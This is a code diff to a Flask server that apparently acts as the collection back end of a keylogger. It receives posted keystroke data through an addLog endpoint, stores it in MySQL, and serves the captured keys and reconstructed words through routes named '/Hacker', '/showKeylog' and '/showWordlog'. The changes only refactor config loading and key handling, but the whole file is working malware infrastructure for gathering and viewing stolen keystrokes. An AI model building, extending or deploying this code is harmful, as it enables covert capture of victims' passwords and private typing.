@@ -9,6 +9,8 @@ from load_config import load_cfg
 #start flask app
 app = Flask(__name__, template_folder='templates')
 
+main_cfg = load_cfg('./main_cfg.json')
+
 def datetime_converter(o):
   if isinstance(o,datetime):
       return o.__str__()
@@ -24,8 +26,8 @@ def addLog():
 
   for key in range(len(data)):      
     try:
-      pushDB_keys(process,json.loads(data[str(key)]))
-      
+      # pushDB_keys(process,json.loads(data[str(key)]))
+      process.addKey(data[str(key)])
       
 
     except Exception as e:
@@ -35,7 +37,7 @@ def addLog():
   
   return make_response(jsonify({'response': 'Success', 'code':200}), 200)
 
-
+'''
 def pushDB_keys(process,payload):
   if (payload['keyName'] != "Space" or payload['keyName'] != "Return"):
     process.separateBreakChar(payload)
@@ -59,15 +61,14 @@ def pushDB_keys(process,payload):
   
   db.commit()
   return 0 
+'''
 
 @app.route('/Hacker', methods=['GET'])
 def showKeylog():
   return render_template('base.html')
 
 @app.route('/showKeylog', methods=['GET'])
-def pushKeylog():
-  main_cfg = load_cfg('./main_cfg.json')
-  res = {}
+def pushKeylog():  
 
   db = mysql.connector.connect (
     host=main_cfg['dbHost'],
@@ -78,6 +79,8 @@ def pushKeylog():
   )
   
   mycursor = db.cursor()
+  
+  res = {}
   
   sql = f"SELECT * FROM {main_cfg['dbKeyTable']}"
   mycursor.execute(sql)
@@ -90,9 +93,7 @@ def pushKeylog():
   return res
 
 @app.route('/showWordlog', methods=['GET'])
-def pushWordlog():
-  main_cfg = load_cfg('./main_cfg.json')
-  res = {}
+def pushWordlog():  
 
   db = mysql.connector.connect (
     host=main_cfg['dbHost'],
@@ -103,6 +104,8 @@ def pushWordlog():
   )
   
   mycursor = db.cursor()
+  
+  res = {}
   
   sql = f"SELECT * FROM {main_cfg['dbWordTable']}"
   mycursor.execute(sql)
